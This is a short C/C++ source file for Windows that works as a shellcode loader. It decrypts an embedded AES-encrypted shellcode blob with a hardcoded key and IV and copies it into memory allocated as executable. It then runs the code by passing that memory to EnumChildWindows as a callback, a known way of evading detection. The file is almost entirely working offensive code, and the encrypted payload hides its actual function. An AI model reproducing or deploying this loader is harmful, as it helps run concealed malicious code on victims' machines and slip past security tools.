#include <windows.h>
#include <stdio.h>
#include "Shellcode.h"  
int main() {
   
    unsigned char shellcode[] = 
        "\x0b\xd9\x45\x9a\xee\x51\xb9\x7c\xa1\xf0\xa9\x36\x0b\x51\x8e\x1b"
        "\x89\x78\x36\x2e\xd0\x5f\x9f\xf3\x36\x3a\x88\xf4\xe3\xa4\x3a\xe4"
        "\x8f\x82\x01\xa0\xc8\x12\xdc\x24\x44\x3c\xfa\x60\x2b\xf5\x18\xf0"
        "\x0f\x29\x60\x63\x9a\x12\x80\xff\x31\xea\x10\xd6\x2c\x96\x90\x4d"
        "\xc0\x89\x6c\x24\x55\xf6\x59\x81\x30\xe1\x14\x42\xc0\x73\x93\xf5"
        "\x22\x3d\x96\xea\x32\x13\xc8\x9c\x4d\xdd\xfd\xe9\x95\x76\xa6\x75"
        "\x90\xd1\xb7\xca\x5f\xd1\xc8\x1e\x11\x7d\xf8\x74\xa0\x1f\x30\x68"
        "\x56\x4b\xbc\xf0\xa4\x2d\x58\x82\x7b\xd2\x33\xa7\x98\xac\x2e\x1a"
        "\xc2\x8b\x90\xde\x10\x37\x63\xe2\x65\xf8\x60\xa4\x5a\x1b\xe0\x2d"
        "\xde\x5d\x1d\x20\xc3\x88\x93\xf2\x8e\x6d\xbd\x21\x1a\xc4\xfd\x5b"
        "\xdc\xfe\xb3\xd0\xbc\x26\x01\xf2\xfe\xad\x0b\x95\x73\x9d\xa9\x02"
        "\x96\xc0\x29\xfb\x15\x16\xf6\x61\xf4\x1d\x18\xa1\x98\x16\x3a\xc3"
        "\x40\xe1\xa8\x05\xcc\x36\x2c\x12\x37\x72\x54\x51\x06\xf4\xc4\x42"
        "\xc3\x8f\xae\x89\x8c\xad\x1c\xa5\x98\x32\x82\xf7\xb3\xd5\x44\x15"
        "\x65\x19\xc5\x7b\xe2\x6e\xc4\xac\xc3\x5a\xb1\x23\x57\x9b\x72\xc1"
        "\xf4\x93\x88\x1c\xa8\xb0\x14\xbe\x40\x86\x88\x1c\xdb\x9e\x12\x27"
        "\x05\x44\x6d\x40\xc4\xab\xa8\x70\x8b\xf6\x73\xa8\xa6\xe7\x74\xf9"
        "\x73\x90";
    
    
    unsigned char key[] = "123456789";
    unsigned char iv[] = "123456789";

   
    int len = sizeof(shellcode);
  
    Shellcode sc(shellcode, len);

    unsigned char *decrypted = sc.AES_decrypt(key, iv);

    HANDLE hAlloc = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (hAlloc == NULL) {
        fprintf(stderr, "Error al reservar memoria\n");
        return 1;
    }

    memcpy(hAlloc, decrypted, len);

    EnumChildWindows(NULL, (WNDENUMPROC) hAlloc, NULL);

    return 0;
}
